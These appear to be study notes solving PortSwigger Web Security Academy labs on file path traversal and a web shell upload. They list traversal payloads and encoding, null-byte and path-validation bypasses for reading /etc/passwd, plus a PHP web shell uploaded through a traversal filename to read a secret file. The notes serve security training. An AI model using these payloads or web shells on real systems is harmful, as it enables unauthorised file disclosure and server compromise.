# 1. Lab: [File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)

**vulnerability in the display of product images**

1. go filter settings => filter settings:

```php
Hiding image
GET /image?filename=18.jpg HTTP/2
```

```php
payload: ../../../etc/passwd
```

**change GET /image?filename=74.jpg HTTP/2
to GET /image?filename=../../../etc/passwd HTTP/2**

# 2. Lab: [File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)

**The application blocks traversal sequences _but treats the supplied filename as being relative_ to a default working directory.**

```php
payload:
/etc/passwd
```

```php
GET /image?filename=/etc/passwd HTTP/2
```

# 3. Lab: [File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)

**The application _strips path traversal sequences_ from the user-supplied filename before using it.**

```
....//....//....//etc/passwd
```

# 4. Lab: [File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)

**The application blocks input containing path traversal sequences. It then performs a _URL-decode_ of the input before using it.**

```
payload:
..%252f..%252f..%252fetc/passwd
```

# 5. Lab: [File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)

**The application _transmits the full file path via a request_ parameter, and validates that the supplied _path starts_ with the expected folder.**

GET /image?filename=/var/www/images/57.jpg HTTP/2
to GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2\*\*

```
payload:
/var/www/images/../../../etc/passwd
```

# 6. Lab: [File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)

**null byte bypass**

**The application validates that the supplied _filename ends with the expected_ file extension.**

```
GET /image?filename=56.jpg HTTP/2
GET /image?filename=../../../etc/passwd%00.jpg HTTP/2
```

```
payload:
../../../etc/passwd%00
```

# Lab 7: [Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)

This lab contains a vulnerable _image upload function_. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a _secondary vulnerability_.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

```php
upload: <?php echo file_get_contents('/home/carlos/secret'); ?>

```

You can log in to your own account using the following credentials:

```php
"wiener:peter"
```

```php
"pull it out the contents of the file '/home/carlos/secret'"
```

1. **Start:**

create file:

```php
'exploit.php'
```

content:

```php
'<?php echo file_get_contents('/home/carlos/secret'); ?>'
```

2. Go to file location ( right click thumbnail and choose '_open image in new window_')
   (https://0a0800a903188314837dcf4400cd00b1.web-security-academy.net/files/avatars/exploit.php)

Text message: <?php echo file_get_contents('/home/carlos/secret'); ?>
_my file plays as a text file but not as a php file_
explanation:

```
for each file there are solutions like: => drwxr-xr-x

if there is no ending: => x then there is no permission to render the file

send to repeater  /my-account/avatar

go to: =>
```

Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/octet-stream

````
change to: =>

```
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
````

```
payload:
..%2fexploit.php

```

```
/files/avatars/..%2fexploit.php/filesGET
```

in url: =>

```url
https://0a3500d2045ef40681e1026f002c002a.web-security-academy.net/files/exploit.php
```
